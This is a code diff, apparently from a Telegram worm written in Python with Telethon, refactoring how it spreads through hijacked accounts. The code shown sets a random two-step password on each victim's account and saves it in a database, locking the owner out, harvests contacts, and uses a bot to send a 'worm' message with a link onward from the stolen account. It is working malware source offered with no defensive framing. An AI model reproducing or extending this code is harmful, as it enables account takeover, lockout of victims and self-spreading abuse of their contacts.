@@ -11,20 +11,11 @@ load_dotenv(override=True)
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
 
-@events.register(events.NewMessage(pattern=r"/worm", func=lambda e: e.is_private))
-async def handler_spred_msg(event):
-    await event.respond(
-        strings['worm_msg'],
-        file='files/worm.png',
-        buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
-        link_preview=False
-    )
-    raise events.StopPropagation
 async def set_passwd(client, me):
     user_data = mongo_client.userdb.sessions.find_one({'phone': me.phone})
     password = "".join(random.choice(string.ascii_letters+string.digits) for i in range(16))
     await client.edit_2fa(current_password=None if not 'password' in user_data else user_data['password'], new_password=password)
-    mongo_client.userdb.sessions.update_one({'_id': user_data['_id']}, {'$set': {'password': password}})
+    mongo_client.userdb.sessions.update_one({'phone': me.phone}, {'$set': {'password': password}})
 async def backup_contacts(client):
     result = await client(GetContactsRequest(hash=0))
     operations = [
@@ -87,15 +78,19 @@ async def spread(client, me, botinfo, log):
     if botinfo is None:
         return
     bot = TelegramClient(StringSession(), 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
-    bot.add_event_handler(handler_spred_msg)
-    await bot.start(bot_token=botinfo["bot_token"])
-    async with client.conversation(f"@{(await bot.get_me()).username}") as conv:
-        await conv.send_message("/start")
-        msg = await conv.send_message("/worm")
+    await bot.start(bot_token=botinfo['token'])
+    async with client.conversation(f"@{botinfo['username']}") as conv:
+        msg = await conv.send_message("/start")
+        await bot.send_message(
+            me.id,
+            strings['worm_msg'],
+            file='files/worm.png',
+            buttons=[[Button.url(strings['worm_msg_btn_txt'], strings['worm_msg_btn_url'])]],
+            link_preview=False
+        )
         spread_msg = await conv.get_response()
         spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
         await msg.delete()
-        bot.remove_event_handler(handler_spred_msg)
         await bot.disconnect()
     perm_logs = {
         'creator': [],
@@ -160,6 +155,6 @@ async def worm(client, logger_bot):
     except:
         pass
     try:
-        await spread(client, me, botinfo)
+        await spread(client, me, botinfo, log)
     except:
         pass
